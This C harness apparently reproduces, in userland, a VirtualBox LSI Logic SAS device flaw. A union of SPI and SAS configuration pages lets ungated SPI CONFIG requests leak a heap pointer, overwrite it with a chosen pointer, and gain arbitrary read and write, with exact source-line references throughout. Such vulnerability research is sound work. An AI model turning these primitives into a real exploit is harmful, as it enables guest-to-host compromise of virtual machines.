/*
 * Source harness for VirtualBox OSS 7.2.20 SAS1068 MPT CONFIG leftover.
 * Pin peel f2792cf44f663989818507e36d3db5f978523c5e.
 *
 * Tiny packed structs matching DevLsiLogicSCSI.h. Overlay is LP64:
 * SCSI-SPI Port 0 (12 bytes, AssertCompileSize 12 at h:2251) covers
 * MptConfigurationPagesSas.pManufacturingPage7 (8) + cbManufacturingPage7 (4)
 * at h:3254-3258. Union u { SpiPages | SasPages } at h:3322-3327.
 *
 * SPI Port getter (cpp:2795-2831) has no enmCtrlType check and returns the
 * SpiPages view. CONFIG dispatch SPI cases are ungated (cpp:3203-3211);
 * page-attribute getter is commented out (cpp:3159). READ is PCIPhysWriteMeta
 * of pbPageData (cpp:3293-3306); WRITE is PCIPhysReadMeta into the same
 * overlay (cpp:3308-3322). Manufacturing page 7 getter is SAS-only, derefs
 * pManufacturingPage7 with no NULL check (cpp:2701-2709). SAS alloc fills
 * those pointers at cpp:619-632.
 */

#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define LABEL "vbox-lsilogic-sas-config"
#define WITNESS "VBOX-LSILOGIC-SAS-CONFIG-WITNESS"
#define PIN "7.2.20"
#define PIN_COMMIT "f2792cf44f663989818507e36d3db5f978523c5e"
#define SPI_PORT0_SIZE 12u

/* Dummy SPI Port 0 page data (not a live heap pointer). */
static const uint8_t k_spi_port0_dummy[SPI_PORT0_SIZE] = {
    0x01, 0x00, 0x03, 0x00,
    0xA5, 0xA5, 0xA5, 0xA5,
    0x11, 0x22, 0x33, 0x44,
};

typedef struct MptConfigurationPageSCSISPIPort0 {
    union {
        uint8_t abPageData[SPI_PORT0_SIZE];
    } u;
} MptConfigurationPageSCSISPIPort0;
_Static_assert(sizeof(MptConfigurationPageSCSISPIPort0) == 12,
               "SPI Port 0 AssertCompileSize 12 (DevLsiLogicSCSI.h:2251)");

/* SpiPages start only; later port/device pages sit past the 12-byte overlay. */
typedef struct MptConfigurationPagesSpi {
    struct {
        MptConfigurationPageSCSISPIPort0 SCSISPIPortPage0;
    } aPortPages[1];
} MptConfigurationPagesSpi;

/* abPageData is the byte view at offset 0 (DevLsiLogicSCSI.h:1474-1501). */
typedef struct MptConfigurationPageManufacturing7 {
    union {
        uint8_t abPageData[1];
    } u;
} MptConfigurationPageManufacturing7;

typedef struct MptConfigurationPagesSas {
    MptConfigurationPageManufacturing7 *pManufacturingPage7;
    uint32_t cbManufacturingPage7;
} MptConfigurationPagesSas;
_Static_assert(offsetof(MptConfigurationPagesSas, pManufacturingPage7) == 0,
               "pManufacturingPage7 at 0 on LP64");
_Static_assert(offsetof(MptConfigurationPagesSas, cbManufacturingPage7) == 8,
               "cbManufacturingPage7 at 8 on LP64");
_Static_assert(sizeof(void *) == 8, "LP64 overlay");

typedef union {
    MptConfigurationPagesSpi SpiPages;
    MptConfigurationPagesSas SasPages;
} MptControllerPages;
_Static_assert(offsetof(MptControllerPages, SpiPages) == 0, "SpiPages at 0");
_Static_assert(offsetof(MptControllerPages, SasPages) == 0, "SasPages at 0");

static int fail(const char *reason)
{
    printf("FAIL %s %s %s\n", LABEL, reason, WITNESS);
    fflush(stdout);
    return 1;
}

/* DevLsiLogicSCSI.cpp:2812-2815, no enmCtrlType check. */
static void spi_port0_get(MptConfigurationPagesSpi *spi, uint8_t **ppb, size_t *pcb)
{
    *ppb = spi->aPortPages[0].SCSISPIPortPage0.u.abPageData;
    *pcb = sizeof(spi->aPortPages[0].SCSISPIPortPage0);
}

/* DevLsiLogicSCSI.cpp:2701-2707, SAS only, no NULL check. */
static void mfg_page7_get(MptConfigurationPagesSas *sas, uint8_t **ppb, size_t *pcb)
{
    *ppb = sas->pManufacturingPage7->u.abPageData;
    *pcb = sas->cbManufacturingPage7;
}

static size_t copy_min(size_t a, size_t b)
{
    return a < b ? a : b;
}

static int contains_witness(const uint8_t *buf, size_t n)
{
    size_t wlen = strlen(WITNESS);
    size_t i;

    if (n < wlen) {
        return 0;
    }
    for (i = 0; i + wlen <= n; i++) {
        if (memcmp(buf + i, WITNESS, wlen) == 0) {
            return 1;
        }
    }
    return 0;
}

/* CONFIG READ: PCIPhysWriteMeta of pbPageData (cpp:3293-3306). */
static void config_read(uint8_t *guest_gpa, size_t cb_buffer,
                        const uint8_t *pb_page, size_t cb_page)
{
    memcpy(guest_gpa, pb_page, copy_min(cb_buffer, cb_page));
}

/* CONFIG WRITE: PCIPhysReadMeta into the overlay (cpp:3308-3322). */
static void config_write(const uint8_t *guest_gpa, size_t cb_buffer,
                         uint8_t *pb_page, size_t cb_page)
{
    memcpy(pb_page, guest_gpa, copy_min(cb_buffer, cb_page));
}

static MptConfigurationPageManufacturing7 *alloc_mfg7(const char *text, uint32_t *out_cb)
{
    size_t n = strlen(text) + 1;
    MptConfigurationPageManufacturing7 *page = calloc(1, n);
    if (page == NULL) {
        return NULL;
    }
    memcpy(page->u.abPageData, text, n);
    *out_cb = (uint32_t)n;
    return page;
}

int main(void)
{
    uint8_t *pb_page = NULL;
    size_t cb_page = 0;
    uint8_t leak_buf[SPI_PORT0_SIZE];
    uint8_t guest_write[SPI_PORT0_SIZE];
    uint8_t guest_gpa[128];
    void *leaked_ptr = NULL;
    uint32_t leaked_cb = 0;
    uint32_t real_cb = 0;
    uint32_t planted_cb = 0;
    int leak_ok = 0;
    int plant_ok = 0;
    int arb_read_ok = 0;

    printf("lab=%s pin=%s commit=%s\n", LABEL, PIN, PIN_COMMIT);
    printf("gadget SPI Port 0 12-byte overlay of SAS pManufacturingPage7+cb\n");
    fflush(stdout);

    MptConfigurationPageManufacturing7 *real_mfg7 = alloc_mfg7(WITNESS, &real_cb);
    if (real_mfg7 == NULL) {
        return fail("alloc-real-mfg7");
    }

    /* CONTROL: SpiPages filled with dummy page data, not a heap pointer. */
    MptConfigurationPagesSpi *spi_control = calloc(1, sizeof(*spi_control));
    if (spi_control == NULL) {
        free(real_mfg7);
        return fail("alloc-spi-control");
    }
    memcpy(spi_control->aPortPages[0].SCSISPIPortPage0.u.abPageData,
           k_spi_port0_dummy, SPI_PORT0_SIZE);
    spi_port0_get(spi_control, &pb_page, &cb_page);
    if (cb_page != SPI_PORT0_SIZE) {
        free(spi_control);
        free(real_mfg7);
        return fail("control-page-size");
    }
    memset(leak_buf, 0, sizeof(leak_buf));
    config_read(leak_buf, sizeof(leak_buf), pb_page, cb_page);
    memcpy(&leaked_ptr, leak_buf, sizeof(leaked_ptr));
    memcpy(&leaked_cb, leak_buf + 8, sizeof(leaked_cb));
    if (memcmp(leak_buf, k_spi_port0_dummy, SPI_PORT0_SIZE) != 0) {
        free(spi_control);
        free(real_mfg7);
        return fail("control-not-dummy-page");
    }
    if (leaked_ptr == (void *)real_mfg7) {
        /* Dummy page bytes cannot be the calloc'd mfg7 pointer. */
        return fail("control-looks-like-heap-pointer");
    }
    if (contains_witness(leak_buf, sizeof(leak_buf))) {
        free(spi_control);
        free(real_mfg7);
        return fail("control-contains-witness");
    }
    printf("control overlay-read is page data ptr=%p cb=%u (not real mfg7 %p)\n",
           leaked_ptr, leaked_cb, (void *)real_mfg7);
    fflush(stdout);
    free(spi_control);

    /* LEAK: SAS alloc fills SasPages pointers; SPI Port 0 READ overlays them. */
    MptControllerPages *pages = calloc(1, sizeof(*pages));
    if (pages == NULL) {
        free(real_mfg7);
        return fail("alloc-pages");
    }
    if ((void *)pages->SpiPages.aPortPages[0].SCSISPIPortPage0.u.abPageData
        != (void *)&pages->SasPages.pManufacturingPage7) {
        free(pages);
        free(real_mfg7);
        return fail("overlay-address-mismatch");
    }

    pages->SasPages.pManufacturingPage7 = real_mfg7;
    pages->SasPages.cbManufacturingPage7 = real_cb;

    spi_port0_get(&pages->SpiPages, &pb_page, &cb_page);
    if (cb_page != SPI_PORT0_SIZE) {
        free(pages);
        free(real_mfg7);
        return fail("leak-page-size");
    }
    memset(leak_buf, 0, sizeof(leak_buf));
    leaked_ptr = NULL;
    leaked_cb = 0;
    config_read(leak_buf, sizeof(leak_buf), pb_page, cb_page);
    memcpy(&leaked_ptr, leak_buf, sizeof(leaked_ptr));
    memcpy(&leaked_cb, leak_buf + 8, sizeof(leaked_cb));
    printf("leaked pManufacturingPage7=%p real=%p cb=%u real_cb=%u\n",
           leaked_ptr, (void *)real_mfg7, leaked_cb, real_cb);
    fflush(stdout);
    if (leaked_ptr != (void *)real_mfg7) {
        free(pages);
        free(real_mfg7);
        return fail("leak-pointer-mismatch");
    }
    if (leaked_cb != real_cb) {
        free(pages);
        free(real_mfg7);
        return fail("leak-size-mismatch");
    }
    leak_ok = 1;

    /* PLANT: SPI Port 0 WRITE copies guest bytes onto the SAS pointer+size. */
    MptConfigurationPageManufacturing7 *planted = alloc_mfg7(WITNESS, &planted_cb);
    if (planted == NULL) {
        free(pages);
        free(real_mfg7);
        return fail("alloc-planted");
    }
    if (planted == real_mfg7) {
        free(planted);
        free(pages);
        free(real_mfg7);
        return fail("planted-alias-real");
    }
    memset(guest_write, 0, sizeof(guest_write));
    memcpy(guest_write, &planted, sizeof(planted));
    memcpy(guest_write + 8, &planted_cb, sizeof(planted_cb));
    spi_port0_get(&pages->SpiPages, &pb_page, &cb_page);
    config_write(guest_write, sizeof(guest_write), pb_page, cb_page);
    printf("planted pManufacturingPage7=%p cb=%u sas.ptr=%p sas.cb=%u\n",
           (void *)planted, planted_cb,
           (void *)pages->SasPages.pManufacturingPage7,
           pages->SasPages.cbManufacturingPage7);
    fflush(stdout);
    if (pages->SasPages.pManufacturingPage7 != planted) {
        free(planted);
        free(pages);
        free(real_mfg7);
        return fail("plant-pointer-mismatch");
    }
    if (pages->SasPages.cbManufacturingPage7 != planted_cb) {
        free(planted);
        free(pages);
        free(real_mfg7);
        return fail("plant-size-mismatch");
    }
    plant_ok = 1;

    /* ARB READ: manufacturing page 7 getter + CONFIG READ through planted ptr. */
    memset(guest_gpa, 0, sizeof(guest_gpa));
    mfg_page7_get(&pages->SasPages, &pb_page, &cb_page);
    if (cb_page != planted_cb || cb_page >= sizeof(guest_gpa)) {
        free(planted);
        free(pages);
        free(real_mfg7);
        return fail("arb-read-size");
    }
    config_read(guest_gpa, sizeof(guest_gpa), pb_page, cb_page);
    printf("arb-read guest=%s\n", (const char *)guest_gpa);
    fflush(stdout);
    if (!contains_witness(guest_gpa, sizeof(guest_gpa))) {
        free(planted);
        free(pages);
        free(real_mfg7);
        return fail("arb-read-missing-witness");
    }
    arb_read_ok = 1;

    /* Optional ARB WRITE: memcpy the witness through the planted pointer. */
    memset(planted->u.abPageData, 0, planted_cb);
    memcpy(planted->u.abPageData, WITNESS, strlen(WITNESS) + 1);
    if (memcmp(pages->SasPages.pManufacturingPage7->u.abPageData,
               WITNESS, strlen(WITNESS) + 1) != 0) {
        free(planted);
        free(pages);
        free(real_mfg7);
        return fail("arb-write-missing-witness");
    }
    printf("arb-write memcpy witness through planted pointer\n");
    fflush(stdout);

    free(planted);
    free(pages);
    free(real_mfg7);

    if (!leak_ok || !plant_ok || !arb_read_ok) {
        return fail("incomplete");
    }
    printf("SUCCESS %s leak=yes plant=yes arb-read=yes %s\n", LABEL, WITNESS);
    fflush(stdout);
    return 0;
}
